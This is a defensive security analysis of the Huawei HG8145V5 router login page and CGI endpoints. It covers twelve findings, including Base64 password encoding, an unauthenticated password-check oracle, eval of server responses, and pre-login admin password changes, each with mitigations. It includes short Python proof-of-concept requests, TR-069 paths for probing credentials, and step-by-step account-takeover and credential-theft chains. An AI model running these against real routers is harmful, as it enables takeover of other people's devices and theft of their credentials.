# Security Analysis — Huawei HG8145V5 Web Interface

> **Scope**: Client-side code analysis of the HG8145V5 router login page
> (`index.asp`), utility libraries (`util.js`, `safelogin.js`,
> `RndSecurityFormat.js`, `md5.js`), and the associated CGI endpoints
> discovered from the downloaded site.
>
> **Date**: 2026-02-22
>
> **Disclaimer**: This analysis is performed on router firmware code already
> present in this repository for **educational and defensive security research**
> purposes.  Do not use these findings against devices you do not own.

---

## Table of Contents

1. [V-01: Password Sent as Reversible Base64](#v-01-password-sent-as-reversible-base64)
2. [V-02: Pre-Login Token Endpoint Accessible Without Authentication](#v-02-pre-login-token-endpoint-accessible-without-authentication)
3. [V-03: Pre-Login Password Check Oracle (CheckPwdNotLogin.asp)](#v-03-pre-login-password-check-oracle-checkpwdnotloginasp)
4. [V-04: Anti-CSRF Token (X_HW_Token) Is Predictable / Reusable](#v-04-anti-csrf-token-x_hw_token-is-predictable--reusable)
5. [V-05: JavaScript eval() via dealDataWithFun — Code Injection](#v-05-javascript-eval-via-dealdatawithfun--code-injection)
6. [V-06: Session Cookie Has No Security Attributes](#v-06-session-cookie-has-no-security-attributes)
7. [V-07: FrameModeSwitch.cgi — Unauthenticated Frame Mode Change](#v-07-framemodeswitchcgi--unauthenticated-frame-mode-change)
8. [V-08: TR-069 Object Path Traversal via getajax.cgi](#v-08-tr-069-object-path-traversal-via-getajaxcgi)
9. [V-09: Password Change Without Current Session Auth (MdfPwdNormalNoLg.cgi)](#v-09-password-change-without-current-session-auth-mdfpwdnormalnolgcgi)
10. [V-10: Server Variables Leaked in Login Page HTML](#v-10-server-variables-leaked-in-login-page-html)
11. [V-11: No Rate Limiting on Login Endpoint](#v-11-no-rate-limiting-on-login-endpoint)
12. [V-12: MD5 Used for Password Hashing (Challenge-Response)](#v-12-md5-used-for-password-hashing-challenge-response)
13. [Discovered Endpoints Summary](#discovered-endpoints-summary)
14. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)

---

## V-01: Password Sent as Reversible Base64

**Severity**: HIGH  
**File**: `index.asp` line 520, `util.js` `base64encode()`  
**Type**: Weak credential encoding

### Description

For the default `MEGACABLE2` CfgMode, the login password is encoded using
**plain Base64** before being POSTed to `/login.cgi`:

```javascript
// index.asp line 520
Form.addParameter('PassWord', base64encode(Password.value));
```

Base64 is **not encryption** — it is trivially reversible.  Any network
observer (same LAN, ARP spoofing, compromised switch) can decode the password:

```python
import base64
captured = "ZWVmOTBiMTQ5NjQzMDcwNw=="  # example captured value
print(base64.b64decode(captured).decode())  # → eef90b1496430707
```

### Impact

- **Credential theft** via passive network sniffing (HTTP, not HTTPS)
- Password is effectively transmitted in cleartext

### Mitigation

- Use HTTPS with a valid certificate
- Use a proper challenge-response protocol (HMAC with server nonce)

---

## V-02: Pre-Login Token Endpoint Accessible Without Authentication

**Severity**: MEDIUM  
**File**: `safelogin.js` line 540, `util.js` line 3321  
**Type**: Information disclosure / authentication weakness

### Description

Two token endpoints exist, one for pre-login and one for post-login:

```javascript
var PRE_LOGIN_TOKEN_PATH = '/html/ssmp/common/getRandString.asp';
var LOGIN_TOKEN_PATH = '/html/ssmp/common/GetRandToken.asp';
```

The pre-login token (`getRandString.asp`) is accessible **without any
authentication**.  This token is used as `x.X_HW_Token` in the login form and
in pre-login password change operations.

The `getAuthToken()` function in `safelogin.js` (used during the login page
itself) always calls the pre-login path:

```javascript
function getAuthToken() {
  return ajaxGetAspData(PRE_LOGIN_TOKEN_PATH);  // No auth needed!
}
```

### Impact

- Anti-CSRF token can be fetched by any unauthenticated attacker
- Enables automated credential brute-forcing with valid tokens
- Enables pre-login CGI endpoint abuse (see V-03, V-09)

---

## V-03: Pre-Login Password Check Oracle (CheckPwdNotLogin.asp)

**Severity**: HIGH  
**File**: `index.asp` line 695  
**Type**: Authentication bypass / information disclosure

### Description

The login page includes a `CheckPassword()` function that validates credentials
**before the actual login form is submitted**, using a dedicated ASP endpoint:

```javascript
function CheckPassword(PwdForCheck) {
    var NormalPwdInfo = FormatUrlEncode(PwdForCheck);
    var ParaArrayList = "UserNameInfo=" + Username.value;
    ParaArrayList += "&NormalPwdInfo=" + NormalPwdInfo;

    url_check_pwd = '/asp/CheckPwdNotLogin.asp?&1=1';

    $.ajax({
        type: "POST",
        async: false,
        url: url_check_pwd,
        data: ParaArrayList,
        success: function (data) {
            CheckResult = data;
        }
    });
    return CheckResult;
}
```

This endpoint:
1. Accepts username + password (URL-encoded, not hashed)
2. Returns a numeric result indicating the user type (`1` = normal user,
   `2` = admin)
3. Is called **before** the login form submission
4. Has `"NotLogin"` in its name, suggesting it requires no session

### Impact

- **Password oracle**: Attackers can brute-force passwords by testing them
  against this endpoint without triggering the login lockout counter
- **User type disclosure**: The return value reveals whether the account is
  a normal user (1) or admin (2), enabling privilege targeting
- **Separate from login flow**: The login lockout (`errloginlockNum = 3`) may
  not apply to this endpoint

### PoC

```python
import requests

session = requests.Session()
# Get pre-login token
token = session.post('http://192.168.100.1/html/ssmp/common/getRandString.asp').text.strip()

# Test password without triggering login lockout
result = session.post(
    'http://192.168.100.1/asp/CheckPwdNotLogin.asp?&1=1',
    data={
        'UserNameInfo': 'Mega_gpon',
        'NormalPwdInfo': 'test_password',
    }
)
# Returns: 0 = invalid, 1 = normal user, 2 = admin
print(f"Result: {result.text}")
```

---

## V-04: Anti-CSRF Token (X_HW_Token) Is Predictable / Reusable

**Severity**: MEDIUM  
**File**: `downloaded_site/asp/GetRandCount.asp`  
**Type**: Weak CSRF protection

### Description

The anti-CSRF token (`x.X_HW_Token`) obtained from `/asp/GetRandCount.asp` is
a static hex string per session.  The downloaded token value:

```
332eb228ae4423a4d8ee0e17b0d585628a16465236ff1fd6
```

The token is:
- 48 hex characters (24 bytes)
- Returned as a plain-text file with no additional entropy
- Valid for the entire session duration (no per-request rotation)
- Usable for all CGI operations once obtained

### Impact

- Once leaked (XSS, network sniffing), all admin operations can be performed
- No per-request freshness — captured tokens remain valid

---

## V-05: JavaScript eval() via dealDataWithFun — Code Injection

**Severity**: CRITICAL  
**File**: `util.js` line 3268-3272, `safelogin.js` line 507-511, `index.asp` line 380-385  
**Type**: Remote code execution (client-side)

### Description

The `dealDataWithFun()` function, present in **three separate files**, uses
the `Function()` constructor (equivalent to `eval()`) to execute arbitrary
code returned by the server:

```javascript
function dealDataWithFun(str) {
    if (typeof str === 'string' && str.indexOf('function') === 0) {
        return Function('"use strict";return (' + str + ')')()();
    }
    return str;
}
```

This function is called on every AJAX response from ASP endpoints:

```javascript
function ajaxGetAspData(path) {
    $.ajax({
        url: path,
        success: function (data) {
            result = dealDataWithFun(data);  // eval() on server response!
        }
    });
}
```

The `dealDataWithStr()` function is even more dangerous as it constructs and
executes arbitrary function bodies:

```javascript
function dealDataWithStr(str, repStr) {
    funStr = 'return ' + str + ';';
    str = 'function() {' + funStr + '}';
    return dealDataWithFun(str);  // Executes arbitrary code
}
```

### Impact

- If an attacker can intercept/modify HTTP responses (MitM on the local
  network), they can inject arbitrary JavaScript that executes in the
  admin's browser context
- Combined with the lack of HTTPS, this enables full remote code execution
  in the browser
- Could be used to steal session cookies, modify router configuration, or
  redirect to malicious sites

---

## V-06: Session Cookie Has No Security Attributes

**Severity**: MEDIUM  
**File**: `index.asp` line 518, `util.js` `setCookie()`  
**Type**: Session management weakness

### Description

The session cookie is set by JavaScript with no security attributes:

```javascript
var cookie2 = "Cookie=body:Language:english:id=-1;path=/";
document.cookie = cookie2;
```

The cookie:
- Has **no `Secure` flag** (sent over HTTP)
- Has **no `HttpOnly` flag** (accessible to JavaScript / XSS)
- Has **no `SameSite` attribute** (vulnerable to CSRF)
- Uses a predictable format: `body:Language:{lang}:id={number}`
- The cookie **name** is literally `Cookie` (unusual, could confuse proxies)

### Impact

- XSS can steal session cookies via `document.cookie`
- CSRF attacks can use the victim's session
- Cookie value visible to any JavaScript on the page

---

## V-07: FrameModeSwitch.cgi — Unauthenticated Frame Mode Change

**Severity**: HIGH  
**File**: `index.asp` lines 954-973  
**Type**: Unauthenticated configuration change

### Description

The `FrameModeSubmit()` function sends a POST to `FrameModeSwitch.cgi` to
change the device's operation mode **from the login page** (pre-auth):

```javascript
function FrameModeSubmit() {
    $.ajax({
        type: "POST",
        async: false,
        data: 'X_HW_FrameMode=2',
        url: 'FrameModeSwitch.cgi?&RequestFile=/login.asp',
        success: function(data) {
            window.location = "/login.asp";
        }
    });
}
```

This function:
1. Is callable from the login page (no session required)
2. Does not include an `x.X_HW_Token` CSRF token
3. Changes `X_HW_FrameMode` which affects the device's operating mode
4. Is triggered by clicking the brand logo for GLOBE2 mode (line 1162)

### Impact

- **Unauthenticated device mode change** could alter bridge/router mode
- May expose additional attack surface depending on the mode
- Could be used for denial of service (switching to bridge mode disconnects
  all routing)

### PoC

```python
import requests
requests.post(
    'http://192.168.100.1/FrameModeSwitch.cgi',
    params={'RequestFile': '/login.asp'},
    data={'X_HW_FrameMode': '2'}
)
```

---

## V-08: TR-069 Object Path Traversal via getajax.cgi

**Severity**: HIGH  
**File**: `util.js` line 2759-2773  
**Type**: Information disclosure / privilege escalation

### Description

The `HwAjaxGetPara()` function constructs requests to `/getajax.cgi` with
arbitrary TR-069/CWMP object paths:

```javascript
function HwAjaxGetPara(ObjPath, ParameterList) {
    $.ajax({
        url: '/getajax.cgi?' + ObjPath,
        data: ParameterList,
        success: function(data) {
            Result = hexDecode(data);
        }
    });
}
```

The `ObjPath` parameter is a TR-069 data model path like
`InternetGatewayDevice.LANDevice.1.WLANConfiguration.1`.  From the login
page's password change code, we can see these object paths in use:

```
InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1  (normal user)
InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2  (admin user)
InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1
InternetGatewayDevice.LANDevice.1.WLANConfiguration.5.PreSharedKey.1
```

### Interesting TR-069 Paths to Probe

Based on standard Huawei TR-069 data model and common paths:

| Path | Description |
|------|-------------|
| `InternetGatewayDevice.DeviceInfo.` | Device info, serial, firmware |
| `InternetGatewayDevice.ManagementServer.` | TR-069 ACS URL, credentials |
| `InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.` | All web users |
| `InternetGatewayDevice.LANDevice.1.WLANConfiguration.` | WiFi config + keys |
| `InternetGatewayDevice.WANDevice.` | WAN connection settings |
| `InternetGatewayDevice.Services.` | VoIP, IPTV services |
| `InternetGatewayDevice.X_HW_CLITelnetAccess.` | Telnet access settings |
| `InternetGatewayDevice.X_HW_CLISSHAccess.` | SSH access settings |
| `InternetGatewayDevice.X_HW_DEBUG.` | Debug/diagnostic features |
| `InternetGatewayDevice.Layer3Forwarding.` | Routing table |
| `InternetGatewayDevice.IPPingDiagnostics.` | Ping (potential command injection) |

### Impact

- Read sensitive configuration including WiFi passwords, WAN credentials
- Potentially read/write TR-069 management server credentials
- Access and modify user accounts including admin passwords
- Enable/disable telnet and SSH access
- Read device serial numbers for targeted attacks

---

## V-09: Password Change Without Current Session Auth (MdfPwdNormalNoLg.cgi)

**Severity**: CRITICAL  
**File**: `index.asp` lines 859-882  
**Type**: Authentication bypass

### Description

The password change functionality uses special CGI endpoints with `NoLg`
(No Login) in their names:

```javascript
// Normal user password change (level 1)
Form.setAction('MdfPwdNormalNoLg.cgi?&x=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1&z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1&RequestFile=login.asp');

// Admin password change (level 2)
Form.setAction('MdfPwdAdminNoLg.cgi?&z=InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2&RequestFile=login.asp');
```

These endpoints:
1. Are named `*NoLg.cgi` suggesting they work without a login session
2. Accept password parameters and TR-069 object paths in the URL
3. Use a token from `getAuthToken()` which calls the **pre-login** token
   endpoint (`getRandString.asp`)
4. Can modify **admin** passwords (WebUserInfo.2)
5. Can simultaneously change WiFi passwords

The flow visible in the code:
1. `CheckPwdNotLogin.asp` validates the current password (pre-login)
2. If valid, the new password is submitted to `MdfPwdNormalNoLg.cgi` or
   `MdfPwdAdminNoLg.cgi`
3. Both operations happen **on the login page before authentication**

### Impact

- **Admin password reset** using only: knowledge of the current password +
  a pre-login token
- **WiFi password change** at the same time
- Bypasses the normal authenticated session requirement
- Combined with V-03 (password oracle), enables full account takeover

---

## V-10: Server Variables Leaked in Login Page HTML

**Severity**: LOW  
**File**: `index.asp` lines 56-100  
**Type**: Information disclosure

### Description

The login page HTML embeds numerous server-side variables directly in
JavaScript, accessible to any unauthenticated client:

```javascript
var CfgMode = 'MEGACABLE2';      // ISP configuration profile
var ProductName = 'HG8145V5-12'; // Exact hardware model
var ProductType = '1';           // Device type
var Userlevel = 0;               // Current user privilege level
var defaultUsername = '';         // Sometimes contains default username!
var defaultPassword = '';         // Sometimes contains default password!
var Ssid1 = '';                  // WiFi SSID name
var Ssid2 = '';                  // 5GHz WiFi SSID name
var APPVersion = '1.1.1.1';     // Application version
var errloginlockNum = '3';       // Login lockout threshold
var useChallengeCode = '1';      // Challenge code feature flag
var randcode = '20260221';       // Challenge code value (date-based!)
```

### Particularly Dangerous

- `defaultUsername` and `defaultPassword`: For ISPs like ANTEL, these are
  populated and auto-filled (line 319-320):
  ```javascript
  if ((CfgMode.toUpperCase() == 'ANTEL2') || (CfgMode.toUpperCase() == 'ANTEL')) {
      $("#txt_Username").val(defaultUsername);
      $("#txt_Password").val(defaultPassword);
  }
  ```
- `randcode = '20260221'`: The "challenge code" is just the current date,
  providing zero security
- `errloginlockNum = '3'`: Reveals exact lockout threshold for brute-force
  calibration

---

## V-11: No Rate Limiting on Login Endpoint

**Severity**: MEDIUM  
**File**: `index.asp` lines 59-65  
**Type**: Brute-force weakness

### Description

The login lockout mechanism is client-side only:

```javascript
var FailStat = '0';
var LoginTimes = '0';
var errloginlockNum = '3';
var LockLeftTime = '0';
```

After `errloginlockNum` (3) failed attempts, the login form disables itself
with JavaScript. However:

1. The lockout counter is embedded in the server-rendered HTML
2. An attacker using direct HTTP requests bypasses client-side JavaScript
3. The `CheckPwdNotLogin.asp` endpoint (V-03) may not share this counter
4. The lock timer (`LockLeftTime`) can be waited out

### Impact

- Client-side lockout easily bypassed by scripted requests
- Combined with V-03, password can be brute-forced via the check endpoint

---

## V-12: MD5 Used for Password Hashing (Challenge-Response)

**Severity**: LOW  
**File**: `md5.js`, `index.asp` line 58  
**Type**: Weak cryptography

### Description

The router includes MD5 hashing functions and declares:

```javascript
function MD5(str) { return hex_md5(str); }
```

MD5 is cryptographically broken since 2004.  While it appears the main
login flow uses Base64 (not MD5), the presence of MD5 and the `useChallengeCode`
variable suggest some configurations may use MD5-based challenge-response.

---

## Discovered Endpoints Summary

### Pre-Login (No Authentication Required)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/index.asp` | GET | Login page (leaks server vars) |
| `/login.asp` | GET | Alternative login page |
| `/asp/GetRandCount.asp` | POST | Get anti-CSRF token |
| `/html/ssmp/common/getRandString.asp` | POST | Get pre-login token |
| `/asp/CheckPwdNotLogin.asp?&1=1` | POST | Validate password (oracle) |
| `/asp/GetRandInfo.asp?&1=1` | POST | Get PBKDF2 params (DVODACOM2WIFI mode) |
| `FrameModeSwitch.cgi` | POST | Change device frame mode |
| `MdfPwdNormalNoLg.cgi` | POST | Change normal user password |
| `MdfPwdAdminNoLg.cgi` | POST | Change admin user password |
| `/login.cgi` | POST | Submit login credentials |
| `getCheckCode.cgi` | GET | Get CAPTCHA image |

### Post-Login (Authenticated)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/getajax.cgi?{ObjPath}` | POST | Read TR-069 config data |
| `/html/ssmp/common/GetRandToken.asp` | POST | Refresh session token |
| `logout.cgi` | POST | End session |
| `/html/ssmp/common/StartFileLoad.asp` | GET | File upload init |

---

## Potential Privilege Escalation Paths

### Path 1: Password Oracle → Admin Account Takeover

```
1. GET /index.asp → extract errloginlockNum, defaultUsername
2. POST /html/ssmp/common/getRandString.asp → get pre-login token
3. POST /asp/CheckPwdNotLogin.asp → brute-force password (no lockout?)
4. POST /login.cgi with discovered password → admin session
```

### Path 2: Pre-Login Password Change → Account Takeover

```
1. POST /html/ssmp/common/getRandString.asp → get pre-login token
2. POST /asp/CheckPwdNotLogin.asp → verify current password
3. POST MdfPwdAdminNoLg.cgi → change admin password to attacker's
4. POST /login.cgi with new password → admin session
```

### Path 3: TR-069 Data Exfiltration → Service Credential Theft

```
1. Login with any valid account
2. POST /getajax.cgi?InternetGatewayDevice.ManagementServer. → ACS creds
3. POST /getajax.cgi?InternetGatewayDevice.WANDevice. → PPPoE creds
4. POST /getajax.cgi?InternetGatewayDevice.LANDevice.1.WLANConfiguration. → WiFi keys
```

### Path 4: Enable Remote Access (Telnet/SSH)

```
1. Login as admin
2. Probe TR-069 paths for telnet/SSH settings:
   - InternetGatewayDevice.X_HW_CLITelnetAccess.
   - InternetGatewayDevice.X_HW_CLISSHAccess.
   - InternetGatewayDevice.X_HW_DEBUG.
3. Set enable flags via appropriate CGI endpoints
```

### Path 5: MitM → Full Router Compromise

```
1. ARP spoof on local network
2. Intercept any admin HTTP request
3. Inject malicious response targeting dealDataWithFun()
4. Execute arbitrary JS → steal session → modify config
```

---

## Recommendations

1. **Enable HTTPS** with certificate validation
2. **Replace Base64 password encoding** with proper challenge-response (HMAC)
3. **Remove `CheckPwdNotLogin.asp`** or add strict rate limiting
4. **Add authentication** to `FrameModeSwitch.cgi` and `MdfPwd*NoLg.cgi`
5. **Replace `dealDataWithFun()`** with JSON.parse() for data deserialization
6. **Add `HttpOnly`, `Secure`, and `SameSite`** attributes to session cookies
7. **Implement server-side rate limiting** on login attempts
8. **Remove default credentials** from login page HTML variables
9. **Rotate X_HW_Token** per-request, not per-session
10. **Restrict `getajax.cgi`** to only serve paths needed by the current user role
